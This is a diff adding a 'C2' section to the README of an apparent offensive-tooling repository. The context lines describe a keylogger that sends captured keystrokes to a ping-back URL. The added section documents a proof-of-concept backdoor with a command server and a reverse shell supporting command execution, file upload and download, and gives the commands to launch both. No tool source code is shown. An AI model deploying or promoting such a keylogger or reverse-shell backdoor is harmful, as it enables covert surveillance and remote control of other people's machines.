@@ -151,3 +151,17 @@ Usage examples:
 *Capture keystrokes and send them to a ping back URL. You need to specify the URL inside the script.*
 
 `python3 keylogger.py`
+
+### C2
+
+The c2 directory contains a POC backdoor example using a server and a reverse shell. You can modify the server
+port according to your needs or by passing arguments.
+You can execute commands as you would do in an msf shell for example.
+Additionally you can `download`, `upload`, `cd` to any directory and `exit` the shell.
+
+Usage example:
+**Server**
+`python3 srv.py -p 8080 -i 0.0.0.0`
+
+**Reverse Shell**
+`python3 rev_shell.py -p 8080 -i 0.0.0.0`
